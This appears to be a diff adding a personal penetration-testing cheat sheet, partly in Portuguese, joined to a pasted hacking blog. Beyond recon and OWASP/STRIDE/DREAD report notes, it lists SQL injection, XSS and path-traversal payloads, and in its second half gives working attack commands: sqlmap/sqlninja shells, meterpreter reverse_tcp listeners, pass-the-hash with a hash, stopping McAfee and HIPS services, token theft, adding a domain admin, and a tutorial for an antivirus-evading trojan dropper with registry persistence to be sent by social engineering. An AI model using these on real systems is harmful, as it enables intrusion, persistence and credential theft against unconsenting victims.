@@ -1,0 +1,1642 @@
+Real World Pen-Test
+===================
+===================
+
+OWASP 2013
+----------
+•	A1 - Injection => https://www.owasp.org/index.php/Top_10_2013-A1-Injection
+•	A2 - Broken Authentication and Session Management => https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management
+•	A3 - Cross-Site Scripting (XSS) => https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
+•	A4 - Insecure Direct Object References => https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References
+•	A5 - Security Misconfiguration => https://www.owasp.org/index.php/Top_10_2013-A5-Security_Misconfiguration
+•	A6 – Sensitive Data Exposure => https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure
+•	A7 – Missing Function Level Access Control => https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control
+•	A8 - Cross-Site Request Dorgery (CSRF) => https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)
+•	A9 - Using Components with Known Vulnerabilities => https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities
+•	A10 – Unvalidated Redirects and Forwards => https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards
+
+OWASP 2017
+----------
+•	A1 - Injection => https://www.owasp.org/index.php/Top_10_2017-A1-Injection
+•	A2 - Broken Authentication and Session Management => https://www.owasp.org/index.php/Top_10_2017-A2-Broken_Authentication_and_Session_Management
+•	A3 - Cross-Site Scripting (XSS) => https://www.owasp.org/index.php/Top_10_2017-A3-Cross-Site_Scripting_(XSS)
+•	A4 - Broken Access Control => https://www.owasp.org/index.php/Top_10_2017-A4-Broken_Access_Control
+•	A5 - Security Misconfiguration => https://www.owasp.org/index.php/Top_10_2017-A5-Security_Misconfiguration
+•	A6 – Sensitive Data Exposure => https://www.owasp.org/index.php/Top_10_2017-A6-Sensitive_Data_Exposure
+•	A7 – Insufficient Attack Protection => https://www.owasp.org/index.php/Top_10_2017-A7-Insufficient_Attack_Protection
+•	A8 - Cross-Site Request Dorgery (CSRF) => https://www.owasp.org/index.php/Top_10_2017-A8-Cross-Site_Request_Forgery_(CSRF)
+•	A9 - Using Components with Known Vulnerabilities => https://www.owasp.org/index.php/Top_10_2017-A9-Using_Components_with_Known_Vulnerabilities
+•	A10 – Underprotected API => https://www.owasp.org/index.php/Top_10_2017-A10-Underprotected_APIs
+
+
+
+
+Reconnaissance
+==============
+
+Passive Recon
+-------------
+
+Scanning
+========
+
+. Ping Sweep
+	. nmap -sP 10.10.10.*
+	. nmap -sP 10.10.10.1/24
+	. nmap -sP 10.10.10.1-254
+	
+	ICMP Blocked
+	. nmap -sL 10.10.10.*
+	. ./ipcrawl 10.10.10.1 10.10.10.254
+		. https://github.com/BenDrysdale/ipcrawl
+. Port Scan
+	. nmap -sS 10.10.10.15
+	. nmap -sS -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+
+	Intrusion Prevention or Active Filter
+	. nmap -sS -T5 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+	. nmap --scan-delay 15s -p -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 1 probe every 15 seconds
+	. nmap --max-rate 0.1 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 1 packet every 10 seconds
+	. nmap -f -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 8 bytes fragment packets
+	. nmap --mtu 16 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 16 bytes fragment packets
+. BannerGrab
+	. nc 10.10.10.15
+		HEAD / HTTP/1.1 <ENTER><ENTER>
+	. nmap -sV -p 80 10.10.10.15
+	HTTPS/IMAPS/POP3S
+	. openssl s_client -connect 10.10.10.15:443
+		HTTPS HEAD / HTTP/1.1 <ENTER><ENTER>
+	. openssl s_client -connect 10.10.10.15:993
+		IMAPS
+	. openssl s_client -connect 10.10.10.15:995
+		POP3S
+. Vulnerability Research
+	. www.securityfocus.com/bid
+	. www.exploit-db.com
+	. www.packetstormsecurity.org
+. Exploit
+	. gcc exploit.c -o exploitroot
+		. ./exploit
+	. sh exploit.sh
+	. perl exploit.pl
+	. python exploit.py
+	. Metasploit
+
+Devemos achar as seguintes informações:
+. IP Range Determination
+	. Whois
+. Load Balancers
+	. http://toolbar.netcraft.com/site_report/
+		. chease.com --> Hosting History --> BigIP
+		. citigroup.com --> Hosting History --> Citrix NetScaler
+		. dig 
+		. lbd-0.1.sh motorola.com
+			. https://github.com/craig/ge.mine.nu
+			. https://packetstormsecurity.com/files/46871/lbd-0.1.sh.txt.html
+		. halberd microsoft.com
+			. https://github.com//jmbr/halberd
+	Procure no Google sobre esses produtos, valor desses produtos, notas tecnicas, etc.
+
+. Network Intrusion Prevention
+	. osstmm-afs -P HTTP -t www.how2sec.com
+	. proxy ssl
+		vi /etc/xinetd.d/ssltest
+			service ssltest
+			{
+				disable = no
+				socket_type = stream
+				port = 8888
+				wait = no
+				protocolo = tcp
+				user = root
+				server = /opt/ssl_proxy.sh
+				only_from = 127.0.0.1
+				bind = 127.0.0.1
+			}
+		vi /opt/ssl_proxy.sh
+			#!/bin/bash
+
+			openssl s_client -quiet -connect www.how2sec.com:443 2>/dev/null
+		. osstmm-afd -P HTTP -t 127.0.0.1 -p 8888 -v
+
+. Web Application Firewall
+	. wafw00f http://www.oracle.com
+		. https://github.com/EnableSecurity/wafw00f
+	. nmap -p 80 --script http-waf-detect.nse www.oracle.com
+
+
+Network Vulnerability
+=====================
+
+. Executar pelomenos 2 network vulnerability scanners na subrede do alvo
+. Em primeiro lugar para reduzir os pontenciais falsos positivos
+. Em segundo para ver se o primeiro scanner não deixou passar alguma vulnerabilidade
+
+	. Nessus
+	. OpenVAS
+
+Não deixe de usar também oo NSE do NMAP e o Módulos Auxiliares no Metasploit
+	. https://github.com/leebaird/discover
+
+
+Web Application Vulnerability
+=============================
+
+. Executar pelomenos 2 network vulnerability scanners na subrede do alvo
+. Em primeiro lugar para reduzir os pontenciais falsos positivos
+. Em segundo para ver se o primeiro scanner não deixou passar alguma vulnerabilidade
+
+	. Burp Suite
+	. W3AF
+	. Arachni
+	. Wepiti
+
+Manual Web App Testing
+. Does the page talk to a DB?
+	. How do you know it is talking a DB?
+	. Look for parameter passing in both GET and POST requests
+	. http://site.com/page.aspx?user=joe
+		. In this case user is the parameter name
+		. In this case joe is the parameter value
+		. Insert (') in place of or immediately after the parameter value
+		. Read the error to determine the injection type
+	http://10.10.10.15/bookdetail.aspx?id=1
+	http://10.10.10.15/bookdetail.aspx?id=1'
+		. Olhe o erro se é de SQL e qual o tipo de base --> System.Data.SqlException
+	. http://10.10.10.15/login.aspx --> No form coloque hello' hello'
+		. Olhe o erro se é de SQL --> System.Xml.XPath.XPathException -> Não é XML Injection
+	http://10.10.10.15/bookdetail.aspx?id=1 or 1 in (select user)--
+	Utilize o Burp Suite para analisar todas as requisições.
+	. fuzzdb https://github.com/fuzzdb-project/fuzzdb
+		. Vamos utilizar o Burp Suite para fazer o fuzzy para nós
+		Para isso, vá na guia Target->Site Map-> selecione a requisição
+		GET /bookdetail.aspx?id=1, clique com o botão direito do mouse e 
+		aponte para Send to Intruder. Agora vai para a guia Intruder
+		coloque o endereço do host 10.10.10.15 e a porta 80 na guia Target
+		agora clique na guia Positions para ver onde foi marcado o campo
+		que será utilizado para injetar os comandos id=§1§. Agora vamos na
+		guia Payload, em Payload Options podemos ou carregar arquivos com
+		os dados ou simplesmente colcar o conteúdo. Agora clique no botão
+		Start Attack. Agora podemos observar na janela Intruder attack as injeções.
+		Para vermos o que está acontecendo em cada requisição basta selecionar
+		a requisição e navegar nas guias Raw|Parame|Headers|Hex na guia Request.
+		E ver a resposta na guia Response nas guias Raw|Headers|Hex|HTML|Render.
+ or 1=convert(int,(USER))--
+ or 1=convert(int,(DB_NAME))--
+ or 1=convert(int,(@@VERSION))--
+ or 1=convert(int,(SERVERNAME))--
+ or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+' or 1=convert(int,(USER))--
+' or 1=convert(int,(DB_NAME))--
+' or 1=convert(int,(@@VERSION))--
+' or 1=convert(int,(SERVERNAME))--
+' or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+1 or 1=convert(int,(USER))--
+1 or 1=convert(int,(DB_NAME))--
+1 or 1=convert(int,(@@VERSION))--
+1 or 1=convert(int,(SERVERNAME))--
+1 or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+1' or 1=convert(int,(USER))--
+1' or 1=convert(int,(DB_NAME))--
+1' or 1=convert(int,(@@VERSION))--
+1' or 1=convert(int,(SERVERNAME))--
+1' or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+) or 1=convert(int,(USER))--
+) or 1=convert(int,(DB_NAME))--
+) or 1=convert(int,(@@VERSION))--
+) or 1=convert(int,(SERVERNAME))--
+) or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+)' or 1=convert(int,(USER))--
+)' or 1=convert(int,(DB_NAME))--
+)' or 1=convert(int,(@@VERSION))--
+)' or 1=convert(int,(SERVERNAME))--
+)' or =convert(int(SELECT TOP 1 name FROM sysobject WHERE xtype=char(85)))--
+. Can I or someone else see what I type?
+	. Look for any place you can insert text
+		. Search box
+		. Forum
+		. Blog
+		. Guest Book
+		. Contact Us Form
+		. Feedback Form
+		. Chat window
+	. Insert <script>alert('xss')</script> or similar abuse of trust vulnerabilities here
+		.http://10.10.10.15/BasicSearch.aspx?Word=<script>alert(123);</script>
+			. Olhe sempre campos de busca para ver se tem XSS
+. Does the page reference a file?
+	. See if parameters reference a file
+	. Insert ../../../../../etc/passwd
+	. Insert ../../../../../windows/system32/win.ini
+	. http://10.10.10.16/showfile.php?filename=about.txt 
+	. http://10.10.10.16/showfile.php?filename=../../../../../etc/passwd - arq password
+	. http://10.10.10.16/showfile.php?filename=../../../../../etc/issue - versão so
+	. http://10.10.10.16/showfile.php?filename=http://www.outher.com/hello.txt
+
+Report
+======
+
+Be a CONSULTANT not an INSULTANT!
+. Being a really good hacker will often make you a horrible pentester
+. You need to learn sales, and business
+	- Victor Antonio - Sales Presence:
+		. https://www.youtube.com/playlist?list=PLA6As4Un47h-0NzxH0nYf6FIHvM2RGE7Z
+	- Business Metrics For Salespeople:
+		. Https://www.youtube.com/playlist?list=PLA6As4Un47h_fv2DeRDXyowydfRqHGHhE
+STRIDE vs DREAD
+. I use these methods of threat modeling on every security engagement
+. STRIDE - Before a customer buys or builds
+. DREAD - To figure out how bad it is
+
+Threat Modeling - Identify Assets
+
+Info - Application - Host - Network - Critical Assets
+
+Low -> High Vulnerabilities -+
+Low -> High Assets ----------|-> RISK
+Low -> High Threats ---------+
+
+What do we want to protect?
+	. Identity
+	. Repudiation
+	. Financial
+	. Privacy
+	. Regulatory
+	. Availability
+How do we decide what to protect?
+	. Laws
+	. Regulations
+	. Standards
+	. Legal agreements
+	. Information security policy
+
+STRIDE Is for identifying Threadts
+	. Spoofing identity
+	. Tampering with data
+	. Repudiation
+	. Information disclosure
+	. Denial of service
+	. Elevation of privilege
+
+S-TRIDE
+=
+. How important is SPOOFING (scale of 1-10)?
+. Must not be able to impersonate another user
+. Pretending to be a user
+. Pretending to be a server
+. Pretending to be a binary
+
+maiby 5 at 10
+
+S-T-RIDE
+  =
+. How importants is TAMPERING (scale of 1-10)?
+. Changing form fields on the client-side
+	. Cookies
+	. HTTP Headers
+. Changing a file on the disk
+	. Programs
+	. DLLs
+. Changing data in mid-stream
+	. TCP/IP packets
+
+maiby 5 at 10
+
+ST-R-IDE
+   =
+. How important is REPUDIANTION (scale of 1-10)?
+. Proof that a transaction ocurred
+. Access logs
+. Audit trails
+
+maiby 5 at 10
+
+STR-I-DE
+    =
+. How important is INFORMATION LEAKEGE (scale of 1-10)?
+. Examples:
+	. Browsers may expose personal data
+	. Error messages can leak data
+
+maiby 8
+
+STRI-D-E
+     =
+. How important is DoS (scale of 1-10)?
+.Crashing a ebsite by flooding it with requests
+	. Minimize or eliminate
+	. File downloads
+	. Database transactions
+	. Time-consuming actions
+	. Provide unique links per user that can be ignored by the server
+. Are you in a five 9's environment?
+
+maiby 8 or 9
+
+STRID-E
+      =
+. How important is Elevation of Privilege (scale of 1-10)?
+. Exemples:
+	. Going from application level to a server's OS
+	. Going from a low privilege user to admin users
+
+maiby 10
+
+DREAD is for priorization
+
+. Damage pontential
+. Reproducibility
+. Exploitability
+. Affected users
+. Discoverability
+
+Each aspect gets a score. The scores are added for each threat and allows us to decide which one(s) to tabkle first.
+
+D-READ
+=
+. If the threat is realized, how much damage is caused?
+	. None -> 0
+	. One user's data is compromised -> 5
+	. Entire system, app, or database is compromised -> 10
+
+D-R-EAD
+  =
+. How easy is it reproduce?
+	. Very hard for elevated users -> 0
+	. Couple of steps for a logged-in user -> 5
+	. Needs just an anonymous user and an address bar -> 10
+
+DR-E-AD
+   =
+. What do you need to have to exploit the threat?
+	. Super-developer skills and special tools -> 0
+	. Tools can be found easily -> 5
+	. Just a browser -> 10
+
+DRE-A-D
+    =
+. How many users will be affected?
+	. Zero -> 0
+	. Some users, but not all -> 5
+	. All users -> 10
+
+DREA-D
+     =
+. How easy is the vulnerability found?
+	. Very hard or impossible -> 0
+	. Could guess by watching network traffic -> 5
+	. Can be found by Googling -> 9
+	. It's in he address bar -> 10
+
+Writter Report
+
+Scope and Methodology
+	External Reconnaissance
+	External Vulnerability Assessment
+	External Penetration Testing
+Understanding the Results
+	Overall Findings
+	External Assessment
+	External Testing Methodology
+		IP Address - Open Ports - Services Enabled - Plataform
+		x.p.t.o 	- 80/23 	- HTTPd/Telnet 		- Cisco IOS
+		x.p.t.o 	- 10000 	- TCPWrapped 		- Unknown
+		x.p.t.o 	- 80/3389 	- HTTPd/RDP 		- Windows
+		x.p.t.o 	- 8080/22	- Tomcat/SSHd		- Linux
+		...
+	External Website Assessment
+	External Penetration Testing
+Finding and Recommendations
+
+DREAD Scoring Critical
+
+Damange Criteria 	- Damange Description - Critical (Score: 10) - High (score : 7) 	- Medium (Score: 4) 	- Low (Score: 1)
+
+OpenSSH Buffer Management HEAP Overflow
+DREAD Score Summary	
+Status:			Exploit Successful	
+Risk Rating:	CRITICAL
+Category:		SSH
+Affects:		1.2.3.4
+References		CVE-2003-0693
+Damage Potential 	- Reproducibility 	- Exploitability 	- Affected Users 	- Discoverability 	- Total - Remediation Effort
+9					- 9					- 7					- 9					- 10				- 44 	- LOW
+
+
+
+
+
+-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Linux4Dummies
+
+    Home
+    Linux
+    Nagios
+    Ethical Hacking
+    Metasploit
+    Sql Injection
+    Windows
+    About Me
+    CISCO
+    About Me
+    Metasploit
+    Windows
+    Nagios
+    Sql Injection
+    Ethical Hacking
+
+Metasploit
+
+==========
+Metasploit
+==========
+
+Install Metasploit
+------------------
+
+The Metasploit Framework is well-supported on the Ubuntu platform. The following instructions should also apply to Kubuntu, Xubuntu, and Debian.
+ 
+In most cases, you should use the official binary installers, described in the Generic Linux instructions.  If for some reason, the installer does not work for you, the following instructions should get you up and running.
+ 
+Dependencies
+Install the Ruby dependencies:
+ 
+ $ sudo apt-get install ruby libopenssl-ruby libyaml-ruby libdl-ruby libiconv-ruby libreadline-ruby irb ri rubygems
+ 
+Install the Subversion client:
+ 
+ $ sudo apt-get install subversion
+ 
+In order to build the native extensions (pcaprub, lorcon2, etc), the following packages need to be installed:
+ 
+ $ sudo apt-get install build-essential ruby-dev libpcap-dev
+ 
+Metasploit Framework
+Once the dependencies have been installed, download the Unix tarball from the download page and run the following commands:
+or 
+
+Installing Metasploit Framework on Ubuntu
+
+Recently, I had to install Metasploit Framework on Ubuntu. I thought I would document the instructions here. Be sure to check the downloads page on the Metasploit website (http://www.metasploit.com) to get the current version. At the time of this blog the latest version was 3.5.0.
+
+wget http://updates.metasploit.com/data/releases/framework-3.5.0.tar.bz2
+
+$ bunzip2 framework-3.5.0.tar.bz2
+
+$ tar xvf framework-3.5.0.tar
+
+$ sudo mkdir -p /opt/metasploit3
+
+$ sudo cp -a msf3/ /opt/metasploit3/msf3
+
+$ sudo chown root:root -R /opt/metasploit3/msf3
+
+$ sudo ln -sf /opt/metasploit3/msf3/msf* /usr/local/bin/
+
+$ sudo svn update /opt/msf3/
+
+$ sudo crontab -e -u root # Enter "1 * * * * /usr/bin/svn update  /opt/msf3/ >> /var/log/msf3update.log 2>&1
+ 
+ 
+When you've completed this step, you should have a working installation and be able to run modules, pivot through compromised systems, and use most of the Metasploit Framework's features. The following optional installation steps will give you extra functionality.
+ 
+Database Configuration (optional)
+Now that the framework is installed, you'll want to configure a database connection, and enable the Metasploit Framework to connect to it:
+ 
+For postgres, see postgres_setup (recommended)
+For mysql, see mysql_setup
+ 
+Extensions (optional)
+The Metasploit Framework includes a few native Ruby extensions that must be compiled in order to use certain types of modules.
+ 
+To enable raw socket modules:
+ 
+$ sudo apt-get install libpcap-dev
+$ sudo bash
+# cd /opt/metasploit3/msf3/external/pcaprub/
+# ruby extconf.rb
+# make && make install
+ 
+To enable WiFi modules:
+ 
+$ sudo bash
+# cd  /opt/metasploit3/msf3/external/ruby-lorcon2/
+# svn co http://802.11ninja.net/svn/lorcon/trunk lorcon2
+# cd lorcon2
+# ./configure --prefix=/usr && make && make install
+# cd ..
+# ruby extconf.rb
+# make && make install
+ 
+Updates
+
+The Metasploit Framework is updated daily with the latest exploits, payloads, features, and bug fixes. To update your installation of the Metasploit Framework:
+ 
+$ sudo svn update /opt/metasploit3/msf3/
+ 
+This can also be installed into the root user's crontab:
+ 
+$ sudo crontab -e -u root # enter the line below
+1 * * * * /usr/bin/svn update  /opt/metasploit3/msf3/ >> /var/log/msfupdate.log 2>&1
+
+
+Identifying Load Balancers (Active Reconnaissance)
+--------------------------------------------------
+Most load-balancers are deployed for redundancy and performance improvement
+
+As an attacker â€“ load balancers are a headache.You have no idea where you packets are going....
+There is absolutely no point in running tools against a host without knowing if a load balancer has been deployed.
+so some time it shows iis 6 next time you load it shows iis 7 it might be load balance. brother...
+ 
+step 1 is to determine if the host is load balanced....
+Step 2 â€“ determine what type of load balancing is in place (HTTP or DNS)
+
+How can you tell if the target host is behind a load balancer?
+
+Firefox LiveHTTP Headers
+
+- https://addons.mozilla.org/en-US/firefox/addon/3829
+- Look in HTTP header for modifications such as:
+
+1. BIGipServerOS in cookie
+2. nnCoection: close
+3. Cneonction: close
+
+dig
+
+* Look for multiple addresses resolving to one domain name
+* dig google.com
+
+My favourate is Netcraft.com
+
+
+Identifying Intrusion Prevention Systems
+----------------------------------------
+How can you tell if the target host protected an Intrusion Prevention System?
+
+Curl: The netcat of the web app world
+
+http://curl.haxx.se/
+
+curl -i http://www.targetcompany.com/../../WINNT/system32/cmd.exe?d
+curl -i http://www.targetcompany.com/type+c:\winnt\repair\sam._
+
+Look for RSTs and no response....tcpdump/wireshark is your friend ;-)
+
+Active Filter Detection
+- http://www.purehacking.com/afd/downloads.php
+- osstmm-afd -P HTTP -t targetcompany.com -v
+
+Ok, so you're up against an IPS â€“ relax...there are a few other things to consider.
+
+HINT:
+Most IDS/IPS solutions don't monitor SSL encrypted (actually any encrypted) traffic. because your attack is passing in form of encrypted traffic so for example i'm injecting sql inject query IDS dont see those because as said IDS only check for plain text traffic so you need to decrypt traffic using SSL accelarator in front of IDS so it can detect some suspicious traffic. Latest IDS are check for encrypted trffic also but more expansive.
+I dont know why People pay for IPS and run IDS mode fucking Sheet hey dumb ass  turn on IPS  lets block some traffic.
+
+SSL Accelerators are expensive so not everyone has one.
+
+
+Identifying Web Application Firewalls
+--------------------------------------
+
+How can you determine if the target host has deployed a WAF?
+* https://addons.mozilla.org/en-US/firefox/addon/3829
+
+* Look in HTTP header for modifications such as:
+
+1. Cookie Value has WAF info in it
+- BIGipServerwww.google.com_pool_http
+- barra_counter_session
+- WODSESSION
+
+2. Different server response code for hostile request
+- 501 Method Not Implemented this error notify that victim probably deployed web app firewall (WAF)
+
+3. Different "Server" response when hostile packet is sent
+
+WAFs are surprisingly easy to detect?
+-------------------------------------
+
+Generally you just have to send 1 valid request, and one malicious request and diff the response.
+Malicious tends to be any HTTP request that has a payload that contains things like:
+
+   
+    '  â€œ <  ?  #  -  |  ^  *
+
+Bypassing Web Application Firewalls
+-----------------------------------
+
+How can you determine if the target host has deployed a WAF?
+http://packetstormsecurity.org/web/unicode-fun.txt
+
+[j0e@LinuxLaptop toolz]$ ruby unicode-fun.rb
+Enter string to URL Unicode:<script>alert('XSS')</script>
+
+%u003c%uff53%uff43%uff52%uff49%uff50%uff54%u003e%uff41%uff4c%uff45%uff52%uff
+54%uff08%u02b9%uff38%uff33%uff33%u02b9%uff09%u003c%u2215%uff53%uff43%uff52
+%uff49%uff50%uff54%u003e
+
+Curl
+
+curl -i http://www.targetcompany.com/3c%73%63%72%69%70%74%3e%61%6c
+%65%72%74%28%27%58%53%53%27%29%3c%2f%73%63%72%69%70%74%3e
+HTTP/1.1 404 Not Found
+Date: Sat, 14 Mar 2009 19:13:10 GMT
+Server: Apache
+
+
+SQL Injection to Metasploit (SQLNinja)
+--------------------------------------
+cd /home/beatdown/toolz/sqlninja-0.2.3/
+
+vi sqlninja.beatdown.conf
+
+host = [target ip]
+
+page = /vuln/vulnpage.asp
+
+stringstart = VulnID=10;
+
+lhost = [your ip]
+
+device = eth0
+
+msfpath = /home/beatdown/toolz/metasploit
+
+resolvedip = [your ip]
+
+./sqlninja -m t -f sqlninja.beatdown.conf (test for injection)
+./sqlninja -m f -f sqlninja.beatdown.conf (fingerprint the backend db)
+./sqlninja -m u -f sqlninja.beatdown.conf (upload dnstun, netcat, or meterpreter)
+./sqlninja -m s -f sqlninja.beatdown.conf (drop a shell)
+
+cd /home/beatdown/toolz/sqlmap-dev
+
+python sqlmap.py -u "http://www.about2bowned.com/vuln/vulnpage.aspx?VulnID=10" --os-shell -v 1
+os-shell>
+
+python sqlmap.py -u "http://www.about2bowned.com/vuln/vulnpage.aspx?VulnID=10" --os-pwn --msf-path /home/beatdown/toolz/metasploit --priv-esc -v 10
+meterpreter>
+
+Getting in via client-side (client side Attack)
+-----------------------------------------------
+
+sudo ./msfconsole
+
+Be sure to run as root so you can set the LPORT to 443
+use exploit/[name of newest browser, PDF, ActiveX, or fileformat exploit]
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set ExitOnSession false
+set LHOST [your public ip]
+set LPORT 443
+exploit -j
+
+Pivoting In Lan Through Web
+---------------------------
+
+Pivot Attack: Using a compromised host as a launching point to attack other hosts...
+......set up standard exploit
+exploit
+route
+ctrl-z <-- background the session
+
+back <--- you need to get to main msf> prompt
+
+Now set up Pivot with a route add
+route add 192.168.10.131 255.25.255.0 1 <-- Use correct session id
+
+route print <----- verify
+
+use exploit/windows/smb/ms08_067_dcom
+set PAYLOAD windows/shell/bind_tcp
+set RHOST 192.168.10.132
+set LPORT 1234
+
+ctrl-z <-- background the session
+back <--- you need to get to main msf> prompt
+
+Run auxillaries & exploits through your pivot
+use scanner/smb/version
+set RHOSTS 192.168.10.1/24
+run
+
+Common LAN Security Solutions
+-----------------------------
+
+Canâ€™t get on the network?????
+
+1. NO DHCP â€“ static IP addresses
+2. DHCP MAC Address reservations
+3. Port Security
+
+Canâ€™t get on the network?????
+
+1. NO DHCP â€“ static IP addresses
+    -> Steal valid IP address from host
+
+2. DHCP MAC Address reservations
+    -> Steal valid MAC address
+
+3. Port Security
+    -> Steal valid MAC/IP address
+
+Enumerating The Internal Network Against NIPS/HIPS
+--------------------------------------------------
+
+c:\set
+c:\net view
+c:\net view /domain
+c:\net user
+c:\net user /domain
+c:\net localgroup
+c:\net localgroup /domain
+c:\net localgroup administrators
+c:\net localgroup administrators /domain
+c:\net group "Company Admins" /domain
+c:\net user "joe.mccray" /domain
+c:\nltest /dclist:
+
+Use SET to get domain information and username
+
+Use NET VIEW to get computers in the users domain and other domains
+
+Use NET VIEW to get computers in other domains
+
+Use NET USER to get local users on the computer you are on
+
+All users in the current user's domain
+
+Use NET LOCALGROUP to get the local groups on the computer
+
+Use NET LOCALGROUP to get the domain groups
+
+All users in the local administrators group
+
+All users in the domain administrators group
+
+All users in the "Company Admins" group
+
+All info about this user
+
+List Domain Controllers...
+
+Basically browsing network neighborhood, and querying Active Directory will always be considered legitimate traffic
+to an NIPS so you can use NET commands to enumerate a network without port scanning.
+
+Looking Around the Network For A User
+-------------------------------------
+
+Some commands to identify a logged in user
+
+NBTSTAT -a remotecomputer | FIND "<03>" | FIND /I /V "remotecomputer"
+
+WMIC /Node:remotecomputer ComputerSystem Get UserName
+
+PSLOGGEDON -L \\remotecomputer
+
+PSEXEC \\remotecomputer NET CONFIG WORKSTATION | FIND /I " name "
+
+PSEXEC \\remotecomputer NET NAME
+
+PSEXEC \\remotecomputer NETSH DIAG SHOW COMPUTER /V | FIND /i "username"
+
+
+Smoking some MSF hash: Moving around the network using password hashes
+----------------------------------------------------------------------
+
+use exploit/windows/smb/psexec
+
+set RHOST 192.168.10.20
+
+set SMBUser administrator
+
+set SMBPass 01fc5a6be7bc6929aad3b435b51404ee:0cb6948805f797bf2a82807973b89537
+
+set PAYLOAD windows/shell/reverse_tcp
+
+set LHOST 192.168.10.10
+
+exploit
+
+Killing The HIPS (as SYSTEM with â€œatâ€ command)
+----------------------------------------------
+1. Stop the overall AV Framework
+net stop "McAfee Framework Service"
+
+2. Stop the HIPS
+net stop hips
+net stop enterceptagent
+net stop firepm
+
+3. McAfee Processes
+pskill -t UdaterUI
+pskill -t TBMon
+pskill -t Mcshield
+pskill -t VsTskMgr
+pskill -t shstat
+
+4. HIPS Processes
+pskill -t firetray
+
+or get system from meterpreter latest ver of metasploit do all for you withing one command
+
+Stealing a domain administrator's token....
+-------------------------------------------
+meterpreter> use incognito
+
+meterpreter> list_tokens -u
+
+meterpreter> impersonate_token "domain\\user"
+
+meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token
+
+or
+
+meterpreter > list_tokens -g
+
+meterpreter > impersonate_token "DOMAIN\\Domain Admins"
+
+meterpreter> execute -c -H -f cmd -a "/k" -i -t <--- Use the -t to use your impersonated token
+
+Add yourself to the Domain Admin's group
+
+c:\net user j0e j0eR0ck$ /domain /add
+
+c:\net localgroup administrators j0e /domain /add 
+
+Learn metasploit client side Attack
+
+
+
+This is for educational purposes only
+
+Today i show you how to create a trojan/dropper for metasploit and how to backdoor Windows with it.
+
+Here is the method I present to you but I am not the author of this video:
+
+
+http://www.securitytube.net/video/3745
+
+Operating systems used
+
+Backtrack 5 R2 = Attacker(192.168.1.97)
+Windows XP sp3
+
+Operating systems vulnerable
+
+Windows 7 and Xp Any Versions = Slave (192.168.1.7)
+
+Software requirements
+
+Dev-C + + Version 4.9.9.2 (in XP)
+The Source Code of the video.
+
+1 - Create the file ascii.bin
+
+Launch this command in a console on Backtrack :
+Code:
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.97 LPORT=4444 R|msfencode -e x86/shikata_ga_nai -t raw -a x86 -b '\x00\x0a\x0d' -c 1 X> /root/Desktop/ascii.bin
+
+And copy the ascii.bin in /var/www
+Code:
+Pixo@Backtrack 5 R2# cp /root/Desktop/ascii.bin /var/www
+
+2-Create the trojan/dropper
+
+
+In Win XP open Dev-C ++ and click on file => new => project
+Spoiler (Click to View)
+
+Select empty project and name it
+Spoiler (Click to View)
+
+Then create a new source file
+Spoiler (Click to View)
+
+Click on file => save as, and name it
+Spoiler (Click to View)
+
+Go to
+
+
+Code:
+http://www.el-palomo.com/wp-content/uploads/2012/03/codigoC.txt
+
+Copy and Paste the Code
+Spoiler (Click to View)
+
+Now replace the ip address with backtrack ip address
+Spoiler (Click to View)
+
+Open the options of project
+Spoiler (Click to View)
+
+Add a link for wininet with the -lwininet command
+Spoiler (Click to View)
+
+For the console is not visible this option is added
+Spoiler (Click to View)
+
+Here you can compil your Trojan/Dropper
+Spoiler (Click to View)
+
+3-Get a Meterpreter
+
+
+Start the listener with this command
+
+
+Code:
+
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.1.97 Autorunscript='migrate -n explorer.exe' E
+
+Spoiler (Click to View)
+
+You can use all of method you want to get a meterpreter.
+
+You can social and send your dropper.
+Spoiler (Click to View)
+
+-For add a icon for your dropper you can use the method used in this thread
+
+You can exploit a vulnerability.
+
+4-Create the persistent backdoor Devlish
+
+
+(I know the script persistence.rb there, but I wanted to do a backdoor persistent and undetectable as possible by the antivirus)
+
+If you use the method for add an icon you can add %windir%\system32 in the extract dir.
+
+If you not you can use the meterpreter for upload your dropper with this command:
+
+
+Code:
+meterpreter> upload /root/exec.exe C:\\Windows\\system32\\
+
+Add an entry in the register for launch your dropper at windows start
+Code:
+
+meterpreter> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v exec -d '"c:\windows\system32\exec.exe"'
+
+Check the register
+Code:
+
+meterpreter>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+
+During the reboot restart your listener
+Code:
+
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.1.97 Autorunscript='migrate -n explorer.exe' E
+
+You may find your Meterpreter restarts automatically soon as a session is opened.
+
+Conclusion
+
+
+Black Hat From here you are the master on board.Black Hat
+
